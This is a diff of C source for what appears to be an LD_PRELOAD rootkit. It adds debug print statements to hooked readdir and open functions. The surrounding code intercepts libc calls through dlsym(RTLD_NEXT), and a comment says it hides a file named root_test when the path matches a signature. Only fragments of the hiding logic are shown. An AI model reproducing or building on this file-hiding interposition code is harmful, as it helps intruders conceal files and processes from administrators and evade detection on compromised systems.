@@ -69,6 +69,11 @@ int unlinkat(int dirfd, const char *path,int flags){
 struct dirent *readdir(DIR *dirp){
     struct dirent *(*my_readdir)(DIR *dirp);
     my_readdir =dlsym(RTLD_NEXT,"readdir");
+
+    #ifdef DEBUG
+        fprintf(stderr,"[*] Inside readdir function \n");
+    #endif
+
     if(!my_readdir)
         return NULL;
 
@@ -86,6 +91,10 @@ struct dirent *readdir(DIR *dirp){
 int open(const char *pathname, int flags, ...){
     int (*my_open)(const char *pathname, int flags, ...);
     my_open = dlsym(RTLD_NEXT,"open");
+    
+    #ifdef DEBUG
+        fprintf(stderr,"[*] Inside open function \n");
+    #endif
 
     //hide file named root_test
     if(strstr(pathname,SIGNATURE_PATH)){
